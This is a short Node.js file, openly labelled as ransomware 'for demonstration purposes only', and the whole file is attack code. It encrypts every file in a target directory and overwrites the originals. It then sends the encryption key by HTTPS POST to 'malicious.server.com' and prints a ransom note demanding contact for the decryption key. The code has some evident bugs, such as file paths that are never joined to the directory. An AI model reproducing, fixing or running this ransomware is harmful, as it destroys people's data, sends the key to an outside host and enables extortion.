// Ransomware code (for demonstration purposes only)
var fs = require('fs');
var crypto = require('crypto');
var https = require('https');

// Directory to target for file encryption
var targetDirectory = '/user/files';

// Generate encryption key
var encryptionKey = crypto.randomBytes(32).toString('hex');

// Read all files in the target directory
fs.readdirSync(targetDirectory).forEach(file => {
  // Skip directories
  if (fs.lstatSync(file).isDirectory()) return;

  // Read file data
  var data = fs.readFileSync(file);

  // Encrypt file data with encryption key
  var cipher = crypto.createCipher('aes-256-cbc', encryptionKey);
  var encryptedData = cipher.update(data, 'utf8', 'hex') + cipher.final('hex');

  // Write encrypted data back to file
  fs.writeFileSync(file, encryptedData);
});

// Send beacon with encryption key (for demonstration purposes only)
var beaconData = JSON.stringify({ key: encryptionKey });
var options = {
  hostname: 'malicious.server.com',
  port: 443,
  path: '/beacon',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': beaconData.length
  }
};

var req = https.request(options, res => {
  console.log(`Beacon sent with status code: ${res.statusCode}`);
});

req.on('error', error => {
  console.error(`Error sending beacon: ${error}`);
});

req.write(beaconData);
req.end();

// Display ransom note to user
var ransomNote = `
Your files have been encrypted!
Contact us at malicious@server.com to get the decryption key.
`;

console.log(ransomNote);
